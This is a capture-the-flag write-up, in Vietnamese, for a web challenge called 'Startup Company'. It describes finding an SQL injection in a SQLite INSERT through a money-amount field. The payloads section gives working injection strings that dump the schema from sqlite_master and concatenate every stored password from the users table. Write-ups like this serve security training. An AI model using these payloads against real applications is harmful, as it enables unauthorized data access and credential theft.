Startup Company
===
**Catergory:** Web

**Author:** MADSTACKS
### Description
Do you want to fund my startup?

### Overview
- Trang web có form đăng nhập và đăng kí tài khoản. Kiểm tra mã nguồn thì không có gì đặc biệt và đáng nghi ngờ
- Thử đăng kí một tài khoản bất kì để đăng nhập vào xem có gì bên trong. Ở đây mình đăng kí với user là test và pass cũng là test.
- Đăng nhập vào thì thấy được một chỗ để chúng ta có thể nhập tiền vào và hiện thị số tiền đó ra.

### Solution
- Author cho biết chương trình sử dụng sqlite nên mình suy nghĩ có thể là sqli. Mình thử một vài payload đơn giản của sqli ở phần form đăng kí và đăng nhập thì thấy không có gì bất thường hay dump ra lỗi của sql vì vậy mình nghĩ không phải sqli ở 2 form này
- Lúc login vào thì có một chỗ cho chúng ta nhập tiền vào và chỉ cho nhập số. Mình thử xóa type number sau đó nhập `1'` thì kết quả nhận được là `database error` => mình có thể sqli ở đây
- Tới đây mình nghĩ ở đây câu query có thể là `insert into table(Amount,...) values('input của chúng ta')`. Vì vậy mình thử injection đơn giản với payload này `1'||(select sqlite_version())-- -` thì ta thấy được nó hiện thị ra version của sqlite.
- Bây giờ chỉ cần dump ra tên table và comlume để tìm kiếm flag.

##### Payload
- `1'||(SELECT tbl_name FROM sqlite_master)-- -` -> dump ra table (startup_users)
- `1'||(SELECT sql FROM sqlite_master)-- -` -> dump ra comlume (nameuser,wordpass,money)
- `1'||(SELECT group_concat(wordpass) FROM startup_users)-- -` -> flag nằm trong này